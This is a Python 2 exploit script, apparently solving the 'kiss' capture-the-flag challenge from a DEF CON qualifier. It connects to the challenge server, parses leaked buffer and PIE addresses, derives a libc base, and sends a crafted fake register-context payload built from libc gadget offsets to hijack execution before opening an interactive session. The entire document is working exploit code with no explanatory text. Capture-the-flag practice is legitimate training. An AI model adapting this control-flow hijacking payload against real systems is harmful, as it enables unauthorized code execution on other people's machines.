import pwnbox
import struct
import random

debug = True
local = False

if local and debug:
    p = pwnbox.pipe.ProcessPipe('gdb -q ./kiss')
elif local:
    p = pwnbox.pipe.ProcessPipe('./kiss')
else:
    p = pwnbox.pipe.SocketPipe('kiss_88581d4e20dc97355f1d86b6905f6103.quals.shallweplayaga.me', 3155)

if local and debug:
    p.read_until('(gdb) ')
    p.write('r\n')

p.read_until('is around')
buf_base = int(p.read_until('\n'),16)
p.read_until('is around')
pie_base = int(p.read_until('\n'),16)

print '%x %x' % (buf_base, pie_base)
if local:
    libc_base = 0x7ffff7a15000
else:
    libc_base = pie_base - 0x5ea000

if local and debug:
    m = buf_base + 0x50
else:
    m = (buf_base + random.randint(0,0x800)) & 0xffffffffffffffffffffffffffffff8
rip = pie_base + 0x870

cont = open('sample_context','rb')
cont_data = cont.read()
cont.close()

p.read_until('want?')
contextPayload = '\x00' * 0x200

contextPayload = struct.pack('<QQ',m+24, libc_base + 0* 0x40FF5 + 1 * 0x498B0) + contextPayload[16:]

contextPayload = contextPayload[0:0xE0] + struct.pack('<Q',m) + contextPayload[0xE8:]

r8 = 1
r9 = 2
r12 = 3
r13 = 4
r14 = 5
r15 = 15
rdi = 6
rsi = 7
rbp = 8
rbx = 9
rdx = 10
rcx = 11
retaddr = 0x12341234
rsp = m

regs = [r8, r9, 0, 0, r12, r13, r14, r15, libc_base + 0x17CCDB, rsi, rbp, rbx, rdx, 0, rcx, rsp, libc_base + 0x46640] # rdi + 0x28 ~ rdi + 0xA0


s = ''
for i in regs:
    s = s + struct.pack("<Q", i)

contextPayload = contextPayload[0:0x28] + s + contextPayload[0xB0:]

payload = struct.pack('<QQ',m+8,m+16) + contextPayload


print contextPayload.encode('hex')
p.write('%x\n' % len(payload))

p.read_until('Waiting for data.')
p.write(payload)

p.read_until('?')

p.write('%x\n' % m)


p.interact()
